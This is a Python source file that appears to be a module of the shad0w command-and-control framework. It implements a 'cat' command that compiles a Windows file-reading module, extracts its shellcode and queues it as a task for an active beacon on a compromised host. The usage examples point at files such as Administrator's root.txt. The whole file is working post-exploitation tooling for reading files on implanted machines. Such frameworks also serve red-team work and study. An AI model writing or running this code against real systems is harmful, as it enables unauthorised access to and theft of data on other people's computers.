# 
# Display the contents of a file
#

import argparse

from lib import buildtools

EXEC_ID = 0x3000

ERROR = False
error_list = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[0;31m{message}\033[0m\n"

def exit(status=0, message=None): 
    if message != None: print(message)
    return

def main(shad0w, args):

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return
    
    # usage examples
    usage_examples = """
Don't try to cat binary files, it doesnt work very well.

Examples:

cat C:\\Users\\Administrator\\root.txt
cat C:\\Users\\thejoker\\Desktop\\evil_plans.txt
"""

    # init the parser
    parse = argparse.ArgumentParser(prog='cat',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("file", nargs='*', help="file you want to display the contents of")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass
    
    # we need a file to read so if we dont then fail
    if len(args.file) == 0:
        print(error_list) 
        parse.print_help()
        return
    
    # clean it up
    read_file = ' '.join(args.file).replace('\\', "\\\\").replace('"', '')

    # clone all the source files
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/cat/", builddir="/root/shad0w/modules/windows/cat/build")

    # set the correct settings
    template = "LPCSTR szFile = \"%s\";" % (read_file)

    buildtools.update_settings_file(None, custom_template=template, custom_path="/root/shad0w/modules/windows/cat/build/settings.h")

    # compile the module
    buildtools.make_in_clone(builddir="/root/shad0w/modules/windows/cat/build", modlocation="/root/shad0w/modules/windows/cat/module.exe")

    # get the shellcode from the module
    rcode = buildtools.extract_shellcode(beacon_file="/root/shad0w/modules/windows/cat/module.exe", want_base64=True)

    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["task"] = (EXEC_ID, rcode)